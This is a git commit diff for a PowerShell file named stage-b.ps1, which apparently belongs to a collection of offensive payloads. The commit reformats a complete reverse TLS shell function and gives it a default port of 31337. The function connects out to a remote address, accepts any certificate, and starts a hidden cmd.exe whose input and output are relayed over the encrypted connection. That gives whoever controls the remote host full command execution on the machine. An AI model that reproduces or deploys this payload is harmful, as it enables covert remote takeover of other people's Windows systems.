8efa0acf61cea5ab9bdd16f454a7b221d19be8ea
Filip's World <52132369+FilipsWorld@users.noreply.github.com>
2021-12-04 17:20:18 +0100

    Update stage-b.ps1

--- payloads/windows/powershell/quick_reverse_tls_shell/stage-b.ps1
+++ payloads/windows/powershell/quick_reverse_tls_shell/stage-b.ps1
@@ -1,41 +1,41 @@
-function rsh($address,$port,$shell='cmd.exe',$parameters)
+function rsh($address,$port=31337,$shell='cmd.exe',$parameters)
 {
-$tcpclient = new-object net.sockets.tcpclient($address,$port)
-$tcpstream = $tcpclient.getstream()
-$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
-$tlsstream.authenticateasclient(0)
-$tlsstreamwriter = new-object io.streamwriter($tlsstream)
-$tlsstreamwriter.autoflush = $true
-$tlsstreamreader = new-object io.streamreader($tlsstream)
-$shellinfo = new-object diagnostics.processstartinfo
-$shellinfo.filename = $shell
-$shellinfo.arguments = $parameters
-$shellinfo.createnowindow = $true
-$shellinfo.useshellexecute = $false
-$shellinfo.redirectstandardoutput = $true
-$shellinfo.redirectstandarderror = $true
-$shellinfo.redirectstandardinput = $true
-$shell = new-object diagnostics.process
-$shell.startinfo = $shellinfo
-$shell.start()
-$stdout = $shell.standardoutput
-$stderr = $shell.standarderror
-$stdin = $shell.standardinput
-while($stdout.peek() -gt -1)
-{
-	$tlsstreamwriter.write([char]$stdout.read())
-}
-while(($shell.hasexited -eq $false))
-{
-	do
-	{
-		$tlsstreamwriter.write([char]$stdout.read())
-	}
-	while($stdout.peek() -gt -1)
-	$stdin.writeline($tlsstreamreader.readline())
+	$tcpclient = new-object net.sockets.tcpclient($address,$port)
+	$tcpstream = $tcpclient.getstream()
+	$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
+	$tlsstream.authenticateasclient(0)
+	$tlsstreamwriter = new-object io.streamwriter($tlsstream)
+	$tlsstreamwriter.autoflush = $true
+	$tlsstreamreader = new-object io.streamreader($tlsstream)
+	$shellinfo = new-object diagnostics.processstartinfo
+	$shellinfo.filename = $shell
+	$shellinfo.arguments = $parameters
+	$shellinfo.createnowindow = $true
+	$shellinfo.useshellexecute = $false
+	$shellinfo.redirectstandardoutput = $true
+	$shellinfo.redirectstandarderror = $true
+	$shellinfo.redirectstandardinput = $true
+	$shell = new-object diagnostics.process
+	$shell.startinfo = $shellinfo
+	$shell.start()
+	$stdout = $shell.standardoutput
+	$stderr = $shell.standarderror
+	$stdin = $shell.standardinput
 	while($stdout.peek() -gt -1)
 	{
 		$tlsstreamwriter.write([char]$stdout.read())
 	}
-}
+	while(($shell.hasexited -eq $false))
+	{
+		do
+		{
+			$tlsstreamwriter.write([char]$stdout.read())
+		}
+		while($stdout.peek() -gt -1)
+		$stdin.writeline($tlsstreamreader.readline())
+		while($stdout.peek() -gt -1)
+		{
+			$tlsstreamwriter.write([char]$stdout.read())
+		}
+	}
 }
